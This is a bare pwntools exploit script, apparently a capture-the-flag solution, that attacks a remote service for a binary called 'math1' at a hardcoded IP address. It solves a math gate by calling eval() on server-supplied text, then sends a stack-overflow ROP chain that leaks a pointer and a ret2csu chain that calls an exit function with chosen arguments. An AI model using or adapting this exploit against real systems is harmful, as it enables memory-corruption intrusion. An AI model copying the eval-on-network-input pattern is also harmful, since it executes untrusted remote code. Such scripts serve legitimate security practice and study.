from pwn import *
elf = ELF('./math1', checksec=False)

def math_goes_skraa():
    p.recvuntil(':)\n')
    res = p.recvuntil('=').decode().split(' ')
    print(res)
    answer = eval(res[0] + res[1] + res[2])
    p.sendline(b'%d' % answer)

    for i in range(99):
        res = p.recvuntil('=').decode().split(' ')
        #print(res)
        answer = eval(res[1] + res[2] + res[3])
        p.sendline(b'%d' % answer)

#p = elf.process()
p = remote('104.199.120.115', 17073)
math_goes_skraa()

# leak pointer
payload = b''.join([
    cyclic(0x10c-4),
    p64(0x000000000040186b), # pop rdi
    p64(0x404030), # str.s
    p64(elf.plt['puts']),
    p64(elf.sym['_start'])
])
p.sendlineafter(b'>', payload)
pointer = u64(p.recvline().strip().ljust(8, b'\x00'))
log.info('leak pointer 0x%x' % pointer)

# ret2csu goes here
math_goes_skraa()
payload = b''.join([
    cyclic(0x10c-4),
    p64(0x00401862), # ret2csu
    p64(0), # rbx
    p64(1), # rbp
    p64(0), # r12 => rdi
    p64(0), # r13 => rsi
    p64(pointer), # r14 => rdx
    p64(0x403d70), # r15 => func => dummy_func
    p64(0x00401848), # func ret2csu

    p64(0), # esp + 8
    p64(0), # rbx
    p64(0), # rbp
    p64(0), # r12 => rdi
    p64(0), # r13 => rsi
    p64(0), # r14 => rdx
    p64(0), # r15 => func => dummy_func

    p64(0x0000000000401869), # pop rsi
    p64(0xffffffffffffff92),
    p64(0),
    p64(0x000000000040186b), # pop rdi
    p64(0xdeeeaaadcafebeef),
    p64(elf.sym['__exit'])
])
p.sendlineafter(b'>', payload)
p.interactive()
